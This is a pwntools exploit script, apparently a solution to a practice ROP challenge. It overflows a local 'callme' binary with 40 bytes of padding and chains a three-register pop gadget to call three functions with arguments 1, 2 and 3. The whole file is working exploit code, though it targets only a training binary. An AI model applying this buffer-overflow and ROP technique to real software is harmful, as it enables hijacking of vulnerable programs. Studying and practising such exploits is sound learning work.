#!/usr/bin/env python3

from pwn import *

pwn = process("./callme")

gadget = p64(0x0000000000401ab0) # pop rdi; pop rsi; pop rdx; ret;
callme_one = p64(0x401850)
callme_two = p64(0x401870)
callme_three = p64(0x401810)
param1 = p64(1)
param2 = p64(2)
param3 = p64(3)

buf = b'A'*40
buf += gadget
buf += param1
buf += param2
buf += param3
buf += callme_one
buf += gadget
buf += param1
buf += param2
buf += param3
buf += callme_two
buf += gadget
buf += param1
buf += param2
buf += param3
buf += callme_three

pwn.sendline(buf)
pwn.interactive()
